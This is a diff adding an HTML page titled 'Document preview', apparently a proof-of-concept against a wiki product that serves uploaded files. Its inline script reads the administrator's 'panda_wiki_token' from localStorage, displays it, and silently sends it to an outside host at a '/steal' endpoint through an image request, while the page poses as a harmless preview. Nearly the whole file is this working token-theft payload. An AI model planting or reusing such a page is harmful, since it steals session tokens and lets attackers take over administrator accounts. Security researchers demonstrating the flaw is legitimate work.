@@ -1,0 +1,25 @@
+<html>
+<head>
+  <title>Document preview</title>
+  <style>
+    body { font-family: -apple-system, "Segoe UI", sans-serif; background: #f5f6f8; margin: 0; }
+    .wrap { max-width: 640px; margin: 80px auto; background: #fff; border-radius: 10px; padding: 32px 40px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+    h1 { font-size: 20px; margin: 0 0 16px; color: #1f2329; }
+    p { color: #4b5563; line-height: 1.7; font-size: 14px; }
+    code { background: #f1f2f4; padding: 2px 6px; border-radius: 4px; font-size: 13px; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>Document preview</h1>
+    <p id="msg">Rendering preview, please wait...</p>
+    <p>Token read from this origin: <code id="tok"></code></p>
+  </div>
+  <script>
+    var token = localStorage.getItem("panda_wiki_token") || "(none)";
+    document.getElementById("tok").textContent = token;
+    document.getElementById("msg").textContent = "Preview loaded. Administrator session was read by the hosted page.";
+    new Image().src = "http://10.213.77.1:18871/steal?t=" + encodeURIComponent(token);
+  </script>
+</body>
+</html>
